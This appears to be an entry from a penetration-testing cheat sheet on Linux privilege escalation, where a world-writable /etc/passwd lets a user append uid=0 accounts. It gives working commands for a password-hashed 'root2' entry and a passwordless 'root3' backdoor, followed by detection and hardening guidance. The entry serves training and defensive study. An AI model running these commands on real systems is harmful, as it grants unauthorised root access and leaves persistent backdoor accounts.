name: Linux PrivEsc - /etc/passwd World-Writable
description: When /etc/passwd is world-writable (rare misconfiguration, also exploitable via capability or SUID vim), generate a password hash with openssl passwd and append a root-equivalent entry. The new user gets uid=0 without modifying the existing root account.
notes: Requires /etc/passwd to be world-writable (check: ls -la /etc/passwd or unix-privesc-check). Modern systems store passwords in /etc/shadow, but if /etc/passwd has a hash in the second field it overrides shadow lookup — old behaviour still honoured by Linux PAM. uid=0 gid=0 = root privileges regardless of username. Also covered in: OSCP PEN-200 Chapter 17 (Linux Privilege Escalation).

examples.label: Check if /etc/passwd is world-writable
examples.command:
ls -la /etc/passwd
# Exploitable: -rw-rw-rw- 1 root root  (world-write set)
# Also check: stat /etc/passwd | grep Access

examples.label: Generate a password hash and append a root-equivalent user
examples.command:
openssl passwd w00t
# Example output: Fdzt.eqJQ4s0g
echo "root2:Fdzt.eqJQ4s0g:0:0:root:/root:/bin/bash" >> /etc/passwd

examples.label: Switch to the new root-equivalent user
examples.command:
su root2
# Password: w00t
id
# uid=0(root) gid=0(root) groups=0(root)

variations.label: Passwordless root entry (empty second field bypasses password check)
variations.command:
echo "root3::0:0:root:/root:/bin/bash" >> /etc/passwd
su root3
# No password required — instant root

source: OSCP PEN-200 Chapter 17: Linux Privilege Escalation

recommended.note: cap_dac_override on vim can edit /etc/passwd even without world-write

defense.why_it_works: Linux PAM checks the second field of /etc/passwd for a password hash before falling back to /etc/shadow. If the field is non-empty, it is used directly. Since /etc/passwd contains uid/gid fields, appending an entry with uid=0 gid=0 grants root-level access to any account whose credentials match the hash.
defense.prerequisites: /etc/passwd writable by the current user (world-writable or owned by current user). openssl available to generate a DES crypt hash.
defense.impact: Full root access via a new uid=0 account. Persistent backdoor account survives password resets of existing accounts.
defense.detection: File integrity monitoring on /etc/passwd (AIDE, Tripwire, auditd -w /etc/passwd -p wa). New UID=0 account appearing outside of normal provisioning process. Auditd: write to /etc/passwd by non-root user.
defense.artifacts: Auditd write event on /etc/passwd by non-root | FIM alert (unexpected /etc/passwd modification) | New uid=0 entry visible in passwd audit
defense.prevention: Ensure /etc/passwd permissions are 644 (root-owned, world-readable only). Monitor permissions with auditd or a FIM tool. Do not grant capabilities or SUID bits to editors that can reach /etc/passwd.
defense.misconfiguration: /etc/passwd permissions set to 666 (world-writable) — sometimes caused by scripts or misconfigurations during deployment.
defense.secure_config:
# Fix permissions
chmod 644 /etc/passwd
chown root:root /etc/passwd

# Audit with auditd
auditctl -w /etc/passwd -p wa -k passwd_changes

# FIM baseline
aide --init && cp /var/lib/aide/aide.db.new /var/lib/aide/aide.db
